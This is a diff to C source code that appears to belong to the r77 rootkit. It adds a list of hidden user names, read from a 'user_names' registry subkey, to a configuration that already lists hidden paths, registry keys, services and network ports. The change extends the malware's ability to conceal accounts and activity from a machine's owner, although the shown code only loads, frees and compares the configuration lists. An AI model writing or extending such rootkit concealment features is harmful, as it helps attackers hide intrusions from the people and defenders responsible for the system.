@@ -11,6 +11,7 @@ PR77_CONFIG LoadR77Config()
 	config->HiddenPaths = CreateStringList(TRUE);
 	config->HiddenRegistryPaths = CreateStringList(TRUE);
 	config->HiddenServiceNames = CreateStringList(TRUE);
+	config->HiddenUserNames = CreateStringList(TRUE);
 	config->HiddenTcpLocalPorts = CreateIntegerList();
 	config->HiddenTcpRemotePorts = CreateIntegerList();
 	config->HiddenUdpPorts = CreateIntegerList();
@@ -68,6 +69,14 @@ PR77_CONFIG LoadR77Config()
 			RegCloseKey(serviceNameKey);
 		}
 
+		// Read user names from the "user_names" subkey.
+		HKEY userNameKey;
+		if (RegOpenKeyExW(key, L"user_names", 0, KEY_READ, &userNameKey) == ERROR_SUCCESS)
+		{
+			LoadStringListFromRegistryKey(config->HiddenUserNames, userNameKey, MAX_PATH);
+			RegCloseKey(userNameKey);
+		}
+
 		// Read local TCP ports from the "tcp_local" subkey.
 		HKEY tcpLocalKey;
 		if (RegOpenKeyExW(key, L"tcp_local", 0, KEY_READ, &tcpLocalKey) == ERROR_SUCCESS)
@@ -113,6 +122,7 @@ VOID DeleteR77Config(PR77_CONFIG config)
 	DeleteStringList(config->HiddenPaths);
 	DeleteStringList(config->HiddenRegistryPaths);
 	DeleteStringList(config->HiddenServiceNames);
+	DeleteStringList(config->HiddenUserNames);
 	DeleteIntegerList(config->HiddenTcpLocalPorts);
 	DeleteIntegerList(config->HiddenTcpRemotePorts);
 	DeleteIntegerList(config->HiddenUdpPorts);
@@ -140,6 +150,7 @@ BOOL CompareR77Config(PR77_CONFIG configA, PR77_CONFIG configB)
 			CompareStringList(configA->HiddenPaths, configB->HiddenPaths) &&
 			CompareStringList(configA->HiddenRegistryPaths, configB->HiddenRegistryPaths) &&
 			CompareStringList(configA->HiddenServiceNames, configB->HiddenServiceNames) &&
+			CompareStringList(configA->HiddenUserNames, configB->HiddenUserNames) &&
 			CompareIntegerList(configA->HiddenTcpLocalPorts, configB->HiddenTcpLocalPorts) &&
 			CompareIntegerList(configA->HiddenTcpRemotePorts, configB->HiddenTcpRemotePorts) &&
 			CompareIntegerList(configA->HiddenUdpPorts, configB->HiddenUdpPorts) &&
